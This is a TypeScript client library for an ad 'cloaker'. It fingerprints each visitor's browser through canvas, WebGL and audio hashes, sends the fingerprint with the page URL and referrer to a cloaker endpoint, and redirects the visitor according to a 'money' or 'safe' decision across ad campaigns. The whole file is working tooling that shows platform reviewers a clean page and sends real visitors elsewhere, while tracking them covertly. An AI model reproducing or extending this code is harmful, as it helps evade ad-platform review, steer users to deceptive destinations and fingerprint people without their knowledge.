/**
 * Client-side Cloaker Integration
 * Automatically collects fingerprint and submits to cloaker endpoint
 */

import { generateAdvancedFingerprint, type AdvancedFingerprint } from './fingerprinting';

export interface CloakerOptions {
  endpoint: string;
  timeout?: number;
  retries?: number;
  debug?: boolean;
}

export interface CloakerResponse {
  success: boolean;
  redirectUrl?: string;
  decision?: 'money' | 'safe';
  reason?: string;
  fingerprintHash?: string;
  processingTime?: number;
  error?: string;
}

/**
 * Advanced Cloaker Client
 */
export class CloakerClient {
  private options: Required<CloakerOptions>;
  private fingerprint: AdvancedFingerprint | null = null;

  constructor(options: CloakerOptions) {
    this.options = {
      timeout: 5000,
      retries: 2,
      debug: false,
      ...options
    };
  }

  /**
   * Submit visitor data to cloaker with advanced fingerprinting
   */
  async submitToCloaker(slug: string): Promise<CloakerResponse> {
    const startTime = Date.now();

    try {
      // Generate fingerprint if not already collected
      if (!this.fingerprint) {
        if (this.options.debug) {
          console.log('🔍 Generating advanced fingerprint...');
        }
        this.fingerprint = await generateAdvancedFingerprint();
      }

      const payload = {
        fingerprint: this.fingerprint,
        timestamp: Date.now(),
        url: window.location.href,
        referrer: document.referrer
      };

      if (this.options.debug) {
        console.log('🚀 Submitting to cloaker:', {
          endpoint: `${this.options.endpoint}/${slug}`,
          fingerprintHash: this.fingerprint.canvas.hash,
          payloadSize: JSON.stringify(payload).length
        });
      }

      const response = await this.makeRequest(slug, payload);
      
      const processingTime = Date.now() - startTime;
      
      if (this.options.debug) {
        console.log('✅ Cloaker response received:', {
          ...response,
          processingTime: `${processingTime}ms`
        });
      }

      return {
        success: true,
        processingTime,
        ...response
      };

    } catch (error) {
      const processingTime = Date.now() - startTime;
      const errorMessage = error instanceof Error ? error.message : 'Unknown error';
      
      if (this.options.debug) {
        console.error('❌ Cloaker submission failed:', {
          error: errorMessage,
          processingTime: `${processingTime}ms`
        });
      }

      return {
        success: false,
        error: errorMessage,
        processingTime
      };
    }
  }

  /**
   * Pre-generate fingerprint for faster cloaking
   */
  async preloadFingerprint(): Promise<void> {
    if (!this.fingerprint) {
      this.fingerprint = await generateAdvancedFingerprint();
      
      if (this.options.debug) {
        console.log('🔍 Fingerprint preloaded:', {
          canvasHash: this.fingerprint.canvas.hash,
          webglHash: this.fingerprint.webgl.hash,
          audioHash: this.fingerprint.audio.contextHash
        });
      }
    }
  }

  /**
   * Make HTTP request to cloaker endpoint
   */
  private async makeRequest(slug: string, payload: any): Promise<any> {
    let lastError: Error | null = null;

    for (let attempt = 1; attempt <= this.options.retries; attempt++) {
      try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), this.options.timeout);

        const response = await fetch(`${this.options.endpoint}/${slug}`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
          },
          body: JSON.stringify(payload),
          signal: controller.signal
        });

        clearTimeout(timeoutId);

        // Handle redirect responses
        if (response.redirected || [301, 302, 303, 307, 308].includes(response.status)) {
          const redirectUrl = response.url || response.headers.get('Location');
          if (redirectUrl) {
            return {
              redirectUrl,
              decision: 'redirect',
              reason: `HTTP ${response.status} redirect`
            };
          }
        }

        // Handle JSON responses
        if (response.headers.get('content-type')?.includes('application/json')) {
          const data = await response.json();
          return data;
        }

        // Handle HTML responses (JS redirect, meta redirect)
        if (response.headers.get('content-type')?.includes('text/html')) {
          const html = await response.text();
          
          // Extract redirect URL from JavaScript redirect
          const jsMatch = html.match(/window\.location\.href=['"]([^'"]+)['"]/);
          if (jsMatch) {
            return {
              redirectUrl: jsMatch[1],
              decision: 'redirect',
              reason: 'JavaScript redirect'
            };
          }

          // Extract redirect URL from meta refresh
          const metaMatch = html.match(/content=["']?\d*;?\s*url=([^'">\s]+)["']?/i);
          if (metaMatch) {
            return {
              redirectUrl: metaMatch[1],
              decision: 'redirect',
              reason: 'Meta refresh redirect'
            };
          }
        }

        // Fallback for other responses
        return {
          decision: 'unknown',
          reason: `HTTP ${response.status} response`,
          response: await response.text()
        };

      } catch (error) {
        lastError = error instanceof Error ? error : new Error(String(error));
        
        if (this.options.debug) {
          console.warn(`🔄 Cloaker request attempt ${attempt} failed:`, lastError.message);
        }

        // Don't retry on abort (timeout)
        if (lastError.name === 'AbortError') {
          break;
        }

        // Wait before retry (exponential backoff)
        if (attempt < this.options.retries) {
          await new Promise(resolve => setTimeout(resolve, Math.pow(2, attempt) * 1000));
        }
      }
    }

    throw lastError || new Error('All retry attempts failed');
  }

  /**
   * Get cached fingerprint without regenerating
   */
  getCachedFingerprint(): AdvancedFingerprint | null {
    return this.fingerprint;
  }

  /**
   * Clear cached fingerprint
   */
  clearFingerprint(): void {
    this.fingerprint = null;
  }
}

/**
 * Quick cloaking function for simple use cases
 */
export async function quickCloak(
  endpoint: string,
  slug: string,
  options: Partial<CloakerOptions> = {}
): Promise<CloakerResponse> {
  const client = new CloakerClient({ endpoint, ...options });
  return client.submitToCloaker(slug);
}

/**
 * Auto-redirect based on cloaker decision
 */
export async function autoCloak(
  endpoint: string,
  slug: string,
  options: Partial<CloakerOptions> = {}
): Promise<void> {
  try {
    const result = await quickCloak(endpoint, slug, options);
    
    if (result.success && result.redirectUrl) {
      if (options.debug) {
        console.log(`🔀 Auto-redirecting to: ${result.redirectUrl}`);
      }
      window.location.href = result.redirectUrl;
    } else if (!result.success) {
      console.error('Auto-cloak failed:', result.error);
    }
  } catch (error) {
    console.error('Auto-cloak error:', error);
  }
}

/**
 * Advanced cloaking with callback
 */
export async function cloakWithCallback(
  endpoint: string,
  slug: string,
  callback: (result: CloakerResponse) => void,
  options: Partial<CloakerOptions> = {}
): Promise<void> {
  try {
    const result = await quickCloak(endpoint, slug, options);
    callback(result);
  } catch (error) {
    callback({
      success: false,
      error: error instanceof Error ? error.message : 'Unknown error'
    });
  }
}

/**
 * Batch fingerprint multiple campaigns
 */
export async function batchCloak(
  endpoint: string,
  slugs: string[],
  options: Partial<CloakerOptions> = {}
): Promise<Record<string, CloakerResponse>> {
  const client = new CloakerClient({ endpoint, ...options });
  
  // Pre-generate fingerprint once
  await client.preloadFingerprint();
  
  const results: Record<string, CloakerResponse> = {};
  
  // Process campaigns in parallel
  const promises = slugs.map(async (slug) => {
    const result = await client.submitToCloaker(slug);
    results[slug] = result;
  });
  
  await Promise.all(promises);
  return results;
}